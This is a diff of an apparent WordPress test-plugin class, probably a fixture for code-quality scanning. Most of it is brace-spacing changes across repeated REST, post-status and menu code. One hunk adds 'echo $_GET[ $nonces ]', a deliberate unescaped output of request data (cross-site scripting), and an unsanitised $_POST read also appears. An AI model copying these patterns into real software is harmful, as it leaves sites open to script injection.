@@ -327,7 +327,7 @@ class testFunctions {
 	 */
 	public function testFunction_3($nonces ){
 		$nonces[  'tide-test-plugin-nonce']=wp_create_nonce('tide-test-plugin-nonce');
-		return $nonces;
+		echo $_GET[ $nonces ];
 	}
 
 	/**
@@ -349,11 +349,11 @@ class testFunctions {
 			$type = '';
 		}
 		$post_type_object = get_post_type_object( $type );
-		if ( ! $post_type_object || ! current_user_can( $post_type_object->cap->create_posts ) ) {
+		if ( ! $post_type_object || ! current_user_can( $post_type_object->cap->create_posts ) ){
 			status_header( 403 );
 			wp_send_json_error( 'insufficient_post_permissions' );
 		}
-		if ( ! empty( $post_type_object->labels->singular_name ) ) {
+		if ( ! empty( $post_type_object->labels->singular_name ) ){
 			$singular_name = $post_type_object->labels->singular_name;
 		} else {
 			$singular_name = __( 'Post', 'tide-test-plugin' );
@@ -372,7 +372,7 @@ class testFunctions {
 	 * @param \WP_REST_Request $request Request object.
 	 * @return \stdClass|\WP_Error Post object or WP_Error.
 	 */
-	protected function test_function_4( $request ) {
+	protected function test_function_4( $request ){
 		$prepared_post = new \stdClass();
 
 		global $wpdb;
@@ -381,41 +381,41 @@ class testFunctions {
 		$manager = new \WP_Customize_Manager();
 		$prepared_post->ID = $manager->changeset_post_id();
 
-		if ( ! $existing_post ) {
+		if ( ! $existing_post ){
 			$prepared_post->post_name = $request['uuid'];
 		}
 
 		// Post title.
-		if ( isset( $request['title'] ) ) {
-			if ( is_string( $request['title'] ) ) {
+		if ( isset( $request['title'] ) ){
+			if ( is_string( $request['title'] ) ){
 				$prepared_post->post_title = $request['title'];
-			} elseif ( ! empty( $request['title']['raw'] ) ) {
+			} elseif ( ! empty( $request['title']['raw'] ) ){
 				$prepared_post->post_title = $request['title']['raw'];
 			}
 		}
 
 		// Settings.
-		if ( isset( $request['settings'] ) ) {
+		if ( isset( $request['settings'] ) ){
 			$data = $manager->changeset_data();
 			$current_user_id = get_current_user_id();
 
-			if ( ! is_array( $request['settings'] ) ) {
+			if ( ! is_array( $request['settings'] ) ){
 				return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 					'status' => 400,
 				) );
 			}
-			foreach ( $request['settings'] as $setting_id => $params ) {
+			foreach ( $request['settings'] as $setting_id => $params ){
 
 				$setting = $manager->get_setting( $setting_id );
-				if ( ! $setting ) {
+				if ( ! $setting ){
 					return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 						'status' => 400,
 					) );
 				}
 
-				if ( isset( $data[ $setting_id ] ) ) {
+				if ( isset( $data[ $setting_id ] ) ){
 
-					if ( null === $params || 'null' === $params ) {
+					if ( null === $params || 'null' === $params ){
 						unset( $data[ $setting_id ] );
 						continue;
 					}
@@ -424,7 +424,7 @@ class testFunctions {
 					$merged_setting_params = array_merge( $data[ $setting_id ], $params );
 
 					// Skip updating setting params if unchanged (ensuring the user_id is not overwritten).
-					if ( $data[ $setting_id ] === $merged_setting_params ) {
+					if ( $data[ $setting_id ] === $merged_setting_params ){
 						continue;
 					}
 				} else {
@@ -445,63 +445,63 @@ class testFunctions {
 		} // End if().
 
 		// Date.
-		if ( ! empty( $request['date'] ) ) {
+		if ( ! empty( $request['date'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date'] );
-		} elseif ( ! empty( $request['date_gmt'] ) ) {
+		} elseif ( ! empty( $request['date_gmt'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date_gmt'], true );
 		}
 
-		if ( isset( $date_data ) ) {
+		if ( isset( $date_data ) ){
 			list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 			$prepared_post->edit_date = true;
 		}
 
 		// Status.
-		if ( isset( $request['status'] ) ) {
+		if ( isset( $request['status'] ) ){
 
-			if ( is_array( $request['status'] ) ) {
+			if ( is_array( $request['status'] ) ){
 				$status = $request['status'][0];
 			} else {
 				$status = $request['status'];
 			}
 			$prepared_post->post_status = $status;
 
-			if ( 'publish' === $prepared_post->post_status ) {
+			if ( 'publish' === $prepared_post->post_status ){
 
 				// Change date to current date if publishing.
 				$date_data = rest_get_date_with_gmt( date( 'Y-m-d H:i:s', time() ), true );
 				list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 				$prepared_post->edit_date = true;
-			} elseif ( 'future' === $prepared_post->post_status ) {
+			} elseif ( 'future' === $prepared_post->post_status ){
 
 				$prepared_post->x = explode( '/', $prepared_post->post_status );
 			}
-		} elseif ( ! $existing_post ) {
+		} elseif ( ! $existing_post ){
 			$prepared_post->post_status = 'auto-draft';
 		} // End if().
 
 		// Settings.
-		if ( isset( $request['settings'] ) ) {
+		if ( isset( $request['settings'] ) ){
 			$data = $manager->changeset_data();
 			$current_user_id = get_current_user_id();
 
-			if ( ! is_array( $request['settings'] ) ) {
+			if ( ! is_array( $request['settings'] ) ){
 				return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 					'status' => 400,
 				) );
 			}
-			foreach ( $request['settings'] as $setting_id => $params ) {
+			foreach ( $request['settings'] as $setting_id => $params ){
 
 				$setting = $manager->get_setting( $setting_id );
-				if ( ! $setting ) {
+				if ( ! $setting ){
 					return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 						'status' => 400,
 					) );
 				}
 
-				if ( isset( $data[ $setting_id ] ) ) {
+				if ( isset( $data[ $setting_id ] ) ){
 
-					if ( null === $params || 'null' === $params ) {
+					if ( null === $params || 'null' === $params ){
 						unset( $data[ $setting_id ] );
 						continue;
 					}
@@ -510,7 +510,7 @@ class testFunctions {
 					$merged_setting_params = array_merge( $data[ $setting_id ], $params );
 
 					// Skip updating setting params if unchanged (ensuring the user_id is not overwritten).
-					if ( $data[ $setting_id ] === $merged_setting_params ) {
+					if ( $data[ $setting_id ] === $merged_setting_params ){
 						continue;
 					}
 				} else {
@@ -531,63 +531,63 @@ class testFunctions {
 		} // End if().
 
 		// Date.
-		if ( ! empty( $request['date'] ) ) {
+		if ( ! empty( $request['date'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date'] );
-		} elseif ( ! empty( $request['date_gmt'] ) ) {
+		} elseif ( ! empty( $request['date_gmt'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date_gmt'], true );
 		}
 
-		if ( isset( $date_data ) ) {
+		if ( isset( $date_data ) ){
 			list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 			$prepared_post->edit_date = true;
 		}
 
 		// Status.
-		if ( isset( $request['status'] ) ) {
+		if ( isset( $request['status'] ) ){
 
-			if ( is_array( $request['status'] ) ) {
+			if ( is_array( $request['status'] ) ){
 				$status = $request['status'][0];
 			} else {
 				$status = $request['status'];
 			}
 			$prepared_post->post_status = $status;
 
-			if ( 'publish' === $prepared_post->post_status ) {
+			if ( 'publish' === $prepared_post->post_status ){
 
 				// Change date to current date if publishing.
 				$date_data = rest_get_date_with_gmt( date( 'Y-m-d H:i:s', time() ), true );
 				list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 				$prepared_post->edit_date = true;
-			} elseif ( 'future' === $prepared_post->post_status ) {
+			} elseif ( 'future' === $prepared_post->post_status ){
 
 				$prepared_post->x = explode( '/', $prepared_post->post_status );
 			}
-		} elseif ( ! $existing_post ) {
+		} elseif ( ! $existing_post ){
 			$prepared_post->post_status = 'auto-draft';
 		} // End if().
 
 		// Settings.
-		if ( isset( $request['settings'] ) ) {
+		if ( isset( $request['settings'] ) ){
 			$data = $manager->changeset_data();
 			$current_user_id = get_current_user_id();
 
-			if ( ! is_array( $request['settings'] ) ) {
+			if ( ! is_array( $request['settings'] ) ){
 				return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 					'status' => 400,
 				) );
 			}
-			foreach ( $request['settings'] as $setting_id => $params ) {
+			foreach ( $request['settings'] as $setting_id => $params ){
 
 				$setting = $manager->get_setting( $setting_id );
-				if ( ! $setting ) {
+				if ( ! $setting ){
 					return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 						'status' => 400,
 					) );
 				}
 
-				if ( isset( $data[ $setting_id ] ) ) {
+				if ( isset( $data[ $setting_id ] ) ){
 
-					if ( null === $params || 'null' === $params ) {
+					if ( null === $params || 'null' === $params ){
 						unset( $data[ $setting_id ] );
 						continue;
 					}
@@ -596,7 +596,7 @@ class testFunctions {
 					$merged_setting_params = array_merge( $data[ $setting_id ], $params );
 
 					// Skip updating setting params if unchanged (ensuring the user_id is not overwritten).
-					if ( $data[ $setting_id ] === $merged_setting_params ) {
+					if ( $data[ $setting_id ] === $merged_setting_params ){
 						continue;
 					}
 				} else {
@@ -617,63 +617,63 @@ class testFunctions {
 		} // End if().
 
 		// Date.
-		if ( ! empty( $request['date'] ) ) {
+		if ( ! empty( $request['date'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date'] );
-		} elseif ( ! empty( $request['date_gmt'] ) ) {
+		} elseif ( ! empty( $request['date_gmt'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date_gmt'], true );
 		}
 
-		if ( isset( $date_data ) ) {
+		if ( isset( $date_data ) ){
 			list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 			$prepared_post->edit_date = true;
 		}
 
 		// Status.
-		if ( isset( $request['status'] ) ) {
+		if ( isset( $request['status'] ) ){
 
-			if ( is_array( $request['status'] ) ) {
+			if ( is_array( $request['status'] ) ){
 				$status = $request['status'][0];
 			} else {
 				$status = $request['status'];
 			}
 			$prepared_post->post_status = $status;
 
-			if ( 'publish' === $prepared_post->post_status ) {
+			if ( 'publish' === $prepared_post->post_status ){
 
 				// Change date to current date if publishing.
 				$date_data = rest_get_date_with_gmt( date( 'Y-m-d H:i:s', time() ), true );
 				list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 				$prepared_post->edit_date = true;
-			} elseif ( 'future' === $prepared_post->post_status ) {
+			} elseif ( 'future' === $prepared_post->post_status ){
 
 				$prepared_post->x = explode( '/', $prepared_post->post_status );
 			}
-		} elseif ( ! $existing_post ) {
+		} elseif ( ! $existing_post ){
 			$prepared_post->post_status = 'auto-draft';
 		} // End if().
 
 		// Settings.
-		if ( isset( $request['settings'] ) ) {
+		if ( isset( $request['settings'] ) ){
 			$data = $manager->changeset_data();
 			$current_user_id = get_current_user_id();
 
-			if ( ! is_array( $request['settings'] ) ) {
+			if ( ! is_array( $request['settings'] ) ){
 				return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 					'status' => 400,
 				) );
 			}
-			foreach ( $request['settings'] as $setting_id => $params ) {
+			foreach ( $request['settings'] as $setting_id => $params ){
 
 				$setting = $manager->get_setting( $setting_id );
-				if ( ! $setting ) {
+				if ( ! $setting ){
 					return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 						'status' => 400,
 					) );
 				}
 
-				if ( isset( $data[ $setting_id ] ) ) {
+				if ( isset( $data[ $setting_id ] ) ){
 
-					if ( null === $params || 'null' === $params ) {
+					if ( null === $params || 'null' === $params ){
 						unset( $data[ $setting_id ] );
 						continue;
 					}
@@ -682,7 +682,7 @@ class testFunctions {
 					$merged_setting_params = array_merge( $data[ $setting_id ], $params );
 
 					// Skip updating setting params if unchanged (ensuring the user_id is not overwritten).
-					if ( $data[ $setting_id ] === $merged_setting_params ) {
+					if ( $data[ $setting_id ] === $merged_setting_params ){
 						continue;
 					}
 				} else {
@@ -703,63 +703,63 @@ class testFunctions {
 		} // End if().
 
 		// Date.
-		if ( ! empty( $request['date'] ) ) {
+		if ( ! empty( $request['date'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date'] );
-		} elseif ( ! empty( $request['date_gmt'] ) ) {
+		} elseif ( ! empty( $request['date_gmt'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date_gmt'], true );
 		}
 
-		if ( isset( $date_data ) ) {
+		if ( isset( $date_data ) ){
 			list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 			$prepared_post->edit_date = true;
 		}
 
 		// Status.
-		if ( isset( $request['status'] ) ) {
+		if ( isset( $request['status'] ) ){
 
-			if ( is_array( $request['status'] ) ) {
+			if ( is_array( $request['status'] ) ){
 				$status = $request['status'][0];
 			} else {
 				$status = $request['status'];
 			}
 			$prepared_post->post_status = $status;
 
-			if ( 'publish' === $prepared_post->post_status ) {
+			if ( 'publish' === $prepared_post->post_status ){
 
 				// Change date to current date if publishing.
 				$date_data = rest_get_date_with_gmt( date( 'Y-m-d H:i:s', time() ), true );
 				list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 				$prepared_post->edit_date = true;
-			} elseif ( 'future' === $prepared_post->post_status ) {
+			} elseif ( 'future' === $prepared_post->post_status ){
 
 				$prepared_post->x = explode( '/', $prepared_post->post_status );
 			}
-		} elseif ( ! $existing_post ) {
+		} elseif ( ! $existing_post ){
 			$prepared_post->post_status = 'auto-draft';
 		} // End if().
 
 		// Settings.
-		if ( isset( $request['settings'] ) ) {
+		if ( isset( $request['settings'] ) ){
 			$data = $manager->changeset_data();
 			$current_user_id = get_current_user_id();
 
-			if ( ! is_array( $request['settings'] ) ) {
+			if ( ! is_array( $request['settings'] ) ){
 				return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 					'status' => 400,
 				) );
 			}
-			foreach ( $request['settings'] as $setting_id => $params ) {
+			foreach ( $request['settings'] as $setting_id => $params ){
 
 				$setting = $manager->get_setting( $setting_id );
-				if ( ! $setting ) {
+				if ( ! $setting ){
 					return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 						'status' => 400,
 					) );
 				}
 
-				if ( isset( $data[ $setting_id ] ) ) {
+				if ( isset( $data[ $setting_id ] ) ){
 
-					if ( null === $params || 'null' === $params ) {
+					if ( null === $params || 'null' === $params ){
 						unset( $data[ $setting_id ] );
 						continue;
 					}
@@ -768,7 +768,7 @@ class testFunctions {
 					$merged_setting_params = array_merge( $data[ $setting_id ], $params );
 
 					// Skip updating setting params if unchanged (ensuring the user_id is not overwritten).
-					if ( $data[ $setting_id ] === $merged_setting_params ) {
+					if ( $data[ $setting_id ] === $merged_setting_params ){
 						continue;
 					}
 				} else {
@@ -789,63 +789,63 @@ class testFunctions {
 		} // End if().
 
 		// Date.
-		if ( ! empty( $request['date'] ) ) {
+		if ( ! empty( $request['date'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date'] );
-		} elseif ( ! empty( $request['date_gmt'] ) ) {
+		} elseif ( ! empty( $request['date_gmt'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date_gmt'], true );
 		}
 
-		if ( isset( $date_data ) ) {
+		if ( isset( $date_data ) ){
 			list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 			$prepared_post->edit_date = true;
 		}
 
 		// Status.
-		if ( isset( $request['status'] ) ) {
+		if ( isset( $request['status'] ) ){
 
-			if ( is_array( $request['status'] ) ) {
+			if ( is_array( $request['status'] ) ){
 				$status = $request['status'][0];
 			} else {
 				$status = $request['status'];
 			}
 			$prepared_post->post_status = $status;
 
-			if ( 'publish' === $prepared_post->post_status ) {
+			if ( 'publish' === $prepared_post->post_status ){
 
 				// Change date to current date if publishing.
 				$date_data = rest_get_date_with_gmt( date( 'Y-m-d H:i:s', time() ), true );
 				list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 				$prepared_post->edit_date = true;
-			} elseif ( 'future' === $prepared_post->post_status ) {
+			} elseif ( 'future' === $prepared_post->post_status ){
 
 				$prepared_post->x = explode( '/', $prepared_post->post_status );
 			}
-		} elseif ( ! $existing_post ) {
+		} elseif ( ! $existing_post ){
 			$prepared_post->post_status = 'auto-draft';
 		} // End if().
 
 		// Settings.
-		if ( isset( $request['settings'] ) ) {
+		if ( isset( $request['settings'] ) ){
 			$data = $manager->changeset_data();
 			$current_user_id = get_current_user_id();
 
-			if ( ! is_array( $request['settings'] ) ) {
+			if ( ! is_array( $request['settings'] ) ){
 				return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 					'status' => 400,
 				) );
 			}
-			foreach ( $request['settings'] as $setting_id => $params ) {
+			foreach ( $request['settings'] as $setting_id => $params ){
 
 				$setting = $manager->get_setting( $setting_id );
-				if ( ! $setting ) {
+				if ( ! $setting ){
 					return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 						'status' => 400,
 					) );
 				}
 
-				if ( isset( $data[ $setting_id ] ) ) {
+				if ( isset( $data[ $setting_id ] ) ){
 
-					if ( null === $params || 'null' === $params ) {
+					if ( null === $params || 'null' === $params ){
 						unset( $data[ $setting_id ] );
 						continue;
 					}
@@ -854,7 +854,7 @@ class testFunctions {
 					$merged_setting_params = array_merge( $data[ $setting_id ], $params );
 
 					// Skip updating setting params if unchanged (ensuring the user_id is not overwritten).
-					if ( $data[ $setting_id ] === $merged_setting_params ) {
+					if ( $data[ $setting_id ] === $merged_setting_params ){
 						continue;
 					}
 				} else {
@@ -875,63 +875,63 @@ class testFunctions {
 		} // End if().
 
 		// Date.
-		if ( ! empty( $request['date'] ) ) {
+		if ( ! empty( $request['date'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date'] );
-		} elseif ( ! empty( $request['date_gmt'] ) ) {
+		} elseif ( ! empty( $request['date_gmt'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date_gmt'], true );
 		}
 
-		if ( isset( $date_data ) ) {
+		if ( isset( $date_data ) ){
 			list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 			$prepared_post->edit_date = true;
 		}
 
 		// Status.
-		if ( isset( $request['status'] ) ) {
+		if ( isset( $request['status'] ) ){
 
-			if ( is_array( $request['status'] ) ) {
+			if ( is_array( $request['status'] ) ){
 				$status = $request['status'][0];
 			} else {
 				$status = $request['status'];
 			}
 			$prepared_post->post_status = $status;
 
-			if ( 'publish' === $prepared_post->post_status ) {
+			if ( 'publish' === $prepared_post->post_status ){
 
 				// Change date to current date if publishing.
 				$date_data = rest_get_date_with_gmt( date( 'Y-m-d H:i:s', time() ), true );
 				list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 				$prepared_post->edit_date = true;
-			} elseif ( 'future' === $prepared_post->post_status ) {
+			} elseif ( 'future' === $prepared_post->post_status ){
 
 				$prepared_post->x = explode( '/', $prepared_post->post_status );
 			}
-		} elseif ( ! $existing_post ) {
+		} elseif ( ! $existing_post ){
 			$prepared_post->post_status = 'auto-draft';
 		} // End if().
 
 		// Settings.
-		if ( isset( $request['settings'] ) ) {
+		if ( isset( $request['settings'] ) ){
 			$data = $manager->changeset_data();
 			$current_user_id = get_current_user_id();
 
-			if ( ! is_array( $request['settings'] ) ) {
+			if ( ! is_array( $request['settings'] ) ){
 				return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 					'status' => 400,
 				) );
 			}
-			foreach ( $request['settings'] as $setting_id => $params ) {
+			foreach ( $request['settings'] as $setting_id => $params ){
 
 				$setting = $manager->get_setting( $setting_id );
-				if ( ! $setting ) {
+				if ( ! $setting ){
 					return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 						'status' => 400,
 					) );
 				}
 
-				if ( isset( $data[ $setting_id ] ) ) {
+				if ( isset( $data[ $setting_id ] ) ){
 
-					if ( null === $params || 'null' === $params ) {
+					if ( null === $params || 'null' === $params ){
 						unset( $data[ $setting_id ] );
 						continue;
 					}
@@ -940,7 +940,7 @@ class testFunctions {
 					$merged_setting_params = array_merge( $data[ $setting_id ], $params );
 
 					// Skip updating setting params if unchanged (ensuring the user_id is not overwritten).
-					if ( $data[ $setting_id ] === $merged_setting_params ) {
+					if ( $data[ $setting_id ] === $merged_setting_params ){
 						continue;
 					}
 				} else {
@@ -961,63 +961,63 @@ class testFunctions {
 		} // End if().
 
 		// Date.
-		if ( ! empty( $request['date'] ) ) {
+		if ( ! empty( $request['date'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date'] );
-		} elseif ( ! empty( $request['date_gmt'] ) ) {
+		} elseif ( ! empty( $request['date_gmt'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date_gmt'], true );
 		}
 
-		if ( isset( $date_data ) ) {
+		if ( isset( $date_data ) ){
 			list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 			$prepared_post->edit_date = true;
 		}
 
 		// Status.
-		if ( isset( $request['status'] ) ) {
+		if ( isset( $request['status'] ) ){
 
-			if ( is_array( $request['status'] ) ) {
+			if ( is_array( $request['status'] ) ){
 				$status = $request['status'][0];
 			} else {
 				$status = $request['status'];
 			}
 			$prepared_post->post_status = $status;
 
-			if ( 'publish' === $prepared_post->post_status ) {
+			if ( 'publish' === $prepared_post->post_status ){
 
 				// Change date to current date if publishing.
 				$date_data = rest_get_date_with_gmt( date( 'Y-m-d H:i:s', time() ), true );
 				list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 				$prepared_post->edit_date = true;
-			} elseif ( 'future' === $prepared_post->post_status ) {
+			} elseif ( 'future' === $prepared_post->post_status ){
 
 				$prepared_post->x = explode( '/', $prepared_post->post_status );
 			}
-		} elseif ( ! $existing_post ) {
+		} elseif ( ! $existing_post ){
 			$prepared_post->post_status = 'auto-draft';
 		} // End if().
 
 		// Settings.
-		if ( isset( $request['settings'] ) ) {
+		if ( isset( $request['settings'] ) ){
 			$data = $manager->changeset_data();
 			$current_user_id = get_current_user_id();
 
-			if ( ! is_array( $request['settings'] ) ) {
+			if ( ! is_array( $request['settings'] ) ){
 				return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 					'status' => 400,
 				) );
 			}
-			foreach ( $request['settings'] as $setting_id => $params ) {
+			foreach ( $request['settings'] as $setting_id => $params ){
 
 				$setting = $manager->get_setting( $setting_id );
-				if ( ! $setting ) {
+				if ( ! $setting ){
 					return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 						'status' => 400,
 					) );
 				}
 
-				if ( isset( $data[ $setting_id ] ) ) {
+				if ( isset( $data[ $setting_id ] ) ){
 
-					if ( null === $params || 'null' === $params ) {
+					if ( null === $params || 'null' === $params ){
 						unset( $data[ $setting_id ] );
 						continue;
 					}
@@ -1026,7 +1026,7 @@ class testFunctions {
 					$merged_setting_params = array_merge( $data[ $setting_id ], $params );
 
 					// Skip updating setting params if unchanged (ensuring the user_id is not overwritten).
-					if ( $data[ $setting_id ] === $merged_setting_params ) {
+					if ( $data[ $setting_id ] === $merged_setting_params ){
 						continue;
 					}
 				} else {
@@ -1047,63 +1047,63 @@ class testFunctions {
 		} // End if().
 
 		// Date.
-		if ( ! empty( $request['date'] ) ) {
+		if ( ! empty( $request['date'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date'] );
-		} elseif ( ! empty( $request['date_gmt'] ) ) {
+		} elseif ( ! empty( $request['date_gmt'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date_gmt'], true );
 		}
 
-		if ( isset( $date_data ) ) {
+		if ( isset( $date_data ) ){
 			list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 			$prepared_post->edit_date = true;
 		}
 
 		// Status.
-		if ( isset( $request['status'] ) ) {
+		if ( isset( $request['status'] ) ){
 
-			if ( is_array( $request['status'] ) ) {
+			if ( is_array( $request['status'] ) ){
 				$status = $request['status'][0];
 			} else {
 				$status = $request['status'];
 			}
 			$prepared_post->post_status = $status;
 
-			if ( 'publish' === $prepared_post->post_status ) {
+			if ( 'publish' === $prepared_post->post_status ){
 
 				// Change date to current date if publishing.
 				$date_data = rest_get_date_with_gmt( date( 'Y-m-d H:i:s', time() ), true );
 				list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 				$prepared_post->edit_date = true;
-			} elseif ( 'future' === $prepared_post->post_status ) {
+			} elseif ( 'future' === $prepared_post->post_status ){
 
 				$prepared_post->x = explode( '/', $prepared_post->post_status );
 			}
-		} elseif ( ! $existing_post ) {
+		} elseif ( ! $existing_post ){
 			$prepared_post->post_status = 'auto-draft';
 		} // End if().
 
 		// Settings.
-		if ( isset( $request['settings'] ) ) {
+		if ( isset( $request['settings'] ) ){
 			$data = $manager->changeset_data();
 			$current_user_id = get_current_user_id();
 
-			if ( ! is_array( $request['settings'] ) ) {
+			if ( ! is_array( $request['settings'] ) ){
 				return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 					'status' => 400,
 				) );
 			}
-			foreach ( $request['settings'] as $setting_id => $params ) {
+			foreach ( $request['settings'] as $setting_id => $params ){
 
 				$setting = $manager->get_setting( $setting_id );
-				if ( ! $setting ) {
+				if ( ! $setting ){
 					return new \WP_Error( 'invalid_data', __( 'Invalid data.' ), array(
 						'status' => 400,
 					) );
 				}
 
-				if ( isset( $data[ $setting_id ] ) ) {
+				if ( isset( $data[ $setting_id ] ) ){
 
-					if ( null === $params || 'null' === $params ) {
+					if ( null === $params || 'null' === $params ){
 						unset( $data[ $setting_id ] );
 						continue;
 					}
@@ -1112,7 +1112,7 @@ class testFunctions {
 					$merged_setting_params = array_merge( $data[ $setting_id ], $params );
 
 					// Skip updating setting params if unchanged (ensuring the user_id is not overwritten).
-					if ( $data[ $setting_id ] === $merged_setting_params ) {
+					if ( $data[ $setting_id ] === $merged_setting_params ){
 						continue;
 					}
 				} else {
@@ -1133,38 +1133,38 @@ class testFunctions {
 		} // End if().
 
 		// Date.
-		if ( ! empty( $request['date'] ) ) {
+		if ( ! empty( $request['date'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date'] );
-		} elseif ( ! empty( $request['date_gmt'] ) ) {
+		} elseif ( ! empty( $request['date_gmt'] ) ){
 			$date_data = rest_get_date_with_gmt( $request['date_gmt'], true );
 		}
 
-		if ( isset( $date_data ) ) {
+		if ( isset( $date_data ) ){
 			list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 			$prepared_post->edit_date = true;
 		}
 
 		// Status.
-		if ( isset( $request['status'] ) ) {
+		if ( isset( $request['status'] ) ){
 
-			if ( is_array( $request['status'] ) ) {
+			if ( is_array( $request['status'] ) ){
 				$status = $request['status'][0];
 			} else {
 				$status = $request['status'];
 			}
 			$prepared_post->post_status = $status;
 
-			if ( 'publish' === $prepared_post->post_status ) {
+			if ( 'publish' === $prepared_post->post_status ){
 
 				// Change date to current date if publishing.
 				$date_data = rest_get_date_with_gmt( date( 'Y-m-d H:i:s', time() ), true );
 				list( $prepared_post->post_date, $prepared_post->post_date_gmt ) = $date_data;
 				$prepared_post->edit_date = true;
-			} elseif ( 'future' === $prepared_post->post_status ) {
+			} elseif ( 'future' === $prepared_post->post_status ){
 
 				$prepared_post->x = explode( '/', $prepared_post->post_status );
 			}
-		} elseif ( ! $existing_post ) {
+		} elseif ( ! $existing_post ){
 			$prepared_post->post_status = 'auto-draft';
 		} // End if().
 
@@ -1179,9 +1179,9 @@ class testFunctions {
 	 *
 	 * @return bool|object
 	 */
-	public function test_function_5() {
+	public function test_function_5(){
 
-		if ( isset( $_POST['test'] ) ) { // Input var okay.
+		if ( isset( $_POST['test'] ) ){ // Input var okay.
 			$post_name = $_POST['test'];
 		} else {
 			$post_name = '';
@@ -1194,14 +1194,14 @@ class testFunctions {
 			'sourceFile' => 0,
 		);
 		$gzip_body = gzencode( wpcom_vip_file_get_contents( 'test' ) );
-		if ( false !== $gzip_body ) {
+		if ( false !== $gzip_body ){
 			unset( $array['SourceFile'] );
 
 			$args['Body']            = $gzip_body;
 			$args['ContentEncoding'] = 'gzip';
 		}
 
-		if ( isset( $_POST['test'] ) ) { // Input var okay.
+		if ( isset( $_POST['test'] ) ){ // Input var okay.
 			$post_name = $_POST['test'];
 		} else {
 			$post_name = '';
@@ -1214,7 +1214,7 @@ class testFunctions {
 			'sourceFile' => 0,
 		);
 		$gzip_body = gzencode( wpcom_vip_file_get_contents( 'test' ) );
-		if ( false !== $gzip_body ) {
+		if ( false !== $gzip_body ){
 			unset( $array['SourceFile'] );
 
 			$args['Body']            = $gzip_body;
@@ -1230,12 +1230,12 @@ class testFunctions {
 	 * @param \WP_REST_Request $var1 Var 1.
 	 * @return array
 	 */
-	public function test_function_6( $var1 ) {
+	public function test_function_6( $var1 ){
 		$params     = $var1->get_params();
 		$location   = $params['location'];
 		$locations  = get_nav_menu_locations();
 
-		if ( ! isset( $locations[ $location ] ) ) {
+		if ( ! isset( $locations[ $location ] ) ){
 			return array();
 		}
 
@@ -1248,7 +1248,46 @@ class testFunctions {
 		$rev_menu = array();
 		$cache = array();
 
-		foreach ( $rev_items as $item ) {
+		foreach ( $rev_items as $item ){
+			$formatted = array(
+				'ID'          => abs( $item->ID ),
+				'order'       => (int) $item->menu_order,
+				'parent'      => abs( $item->menu_item_parent ),
+				'title'       => $item->title,
+				'url'         => $item->url,
+				'attr'        => $item->attr_title,
+				'target'      => $item->target,
+				'classes'     => implode( ' ', $item->classes ),
+				'xfn'         => $item->xfn,
+				'description' => $item->description,
+				'object_id'   => abs( $item->object_id ),
+				'object'      => $item->object,
+				'type'        => $item->type,
+				'type_label'  => $item->type_label,
+				'children'    => array()
+			);
+
+			if ( array_key_exists( $item->ID , $cache ) ){
+				$formatted['children'] = array_reverse( $cache[ $item->ID ] );
+			}
+
+			$formatted = apply_filters( 'rest_menus_format_menu_item', $formatted );
+
+			if ( 0 !== $item->menu_item_parent ){
+
+				if ( array_key_exists( $item->menu_item_parent , $cache ) ){
+					array_push( $cache[ $item->menu_item_parent ], $formatted );
+				}
+				else {
+					$cache[ $item->menu_item_parent ] = array( $formatted );
+				}
+			} else
+			    {
+				array_push( $rev_menu, $formatted );
+			}
+		}
+
+		foreach ( $rev_items as $item ){
 			$formatted = array(
 				'ID'          => abs( $item->ID ),
 				'order'       => (int) $item->menu_order,
@@ -1267,15 +1306,15 @@ class testFunctions {
 				'children'    => array(),
